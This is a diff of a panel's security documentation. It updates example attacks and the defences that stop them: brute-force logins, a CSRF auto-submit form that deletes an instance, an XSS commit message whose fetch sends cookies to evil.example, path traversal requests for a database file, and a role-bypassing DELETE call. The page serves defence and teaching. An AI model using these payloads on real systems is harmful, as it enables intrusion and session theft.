@@ -25,10 +25,10 @@ Each section shows what an attack would look like against this panel, and what h
 **The attack.** A program tries thousands of passwords for the user `admin`.
 
 ```
-POST /api/login {"username": "admin", "password": "123456"}      → 401 Wrong user name or password
-POST /api/login {"username": "admin", "password": "password"}    → 401
+POST /api/v1/session {"username": "admin", "password": "123456"}      → 401 Wrong user name or password
+POST /api/v1/session {"username": "admin", "password": "password"}    → 401
 ... 3 more ...
-POST /api/login {"username": "admin", "password": "admin2024"}   → 429 Too many failed attempts. Try again in 15 minutes.
+POST /api/v1/session {"username": "admin", "password": "admin2024"}   → 429 Too many failed attempts. Try again in 15 minutes.
 ```
 
 **Defences.**
@@ -47,7 +47,7 @@ POST /api/login {"username": "admin", "password": "admin2024"}   → 429 Too man
 sends a request to the panel, hoping the browser attaches the administrator's cookie:
 
 ```html
-<form action="https://<panel link>/api/instances/sales-main/delete" method="POST">
+<form action="https://<panel link>/api/v1/instances/sales-main/actions/delete" method="POST">
   <input name="confirm" value="sales-main">
 </form>
 <script>document.forms[0].submit()</script>
@@ -74,8 +74,8 @@ git commit -m '<img src=x onerror="fetch(`https://evil.example/?c=`+document.coo
 
 **What happens.**
 
-* The panel builds every page from **escaped** text: the message is displayed literally, as the characters
-  `<img src=x ...>`, not as an image.
+* The web app (React) inserts every value as **text**, never as HTML: the message is displayed literally, as the
+  characters `<img src=x ...>`, not as an image.
 * Even if something slipped through, the **Content-Security-Policy** forbids inline scripts and event handlers
   (`onerror=`) and any connection to other sites.
 * The session cookie is `HttpOnly`: scripts cannot read it at all.
@@ -115,7 +115,7 @@ run something else:
 **The attack.** Using `..` to reach files outside the intended folder:
 
 ```
-POST /api/instances/sales-main/remove-submodule {"path": "../../manager"}
+POST /api/v1/instances/sales-main/actions/remove-submodule {"path": "../../manager"}
 GET  /docs/../../manager/sudoo.db
 ```
 
@@ -146,17 +146,17 @@ is refused. Each refusal is a 400 with a sentence saying what to send instead; t
 
 ## 7. Doing more than one's role allows
 
-**The attack.** A sync operator opens the browser's developer tools and calls the delete endpoint directly,
-because the button is hidden for them:
+**The attack.** A developer (a role that may update and restart instances, not delete them) opens the browser's
+developer tools and calls the delete endpoint directly, because the menu item is hidden for them:
 
 ```
-POST /api/instances/sales-main/delete {"confirm": "sales-main"}
-→ 403 Only the administrator can do this. Please contact the administrator, Yousef M. Y. Al Sabbah.
+DELETE /api/v1/instances/sales-main {"confirm": "sales-main"}
+→ 403 Your role cannot do this (delete instances). Please contact the administrator, Yousef M. Y. Al Sabbah.
 ```
 
-**What happens.** Roles are checked on the server for every request; hiding buttons is only for convenience. The
-refusal is written to the audit log. Answers sent to sync operators never contain passwords or ports in the first
-place.
+**What happens.** Every endpoint and action checks a named permission on the server for every request; hiding
+buttons is only for convenience. The refusal is written to the audit log. Answers sent to roles without the
+"see Odoo passwords and ports" permission never contain them in the first place.
 
 ---
 
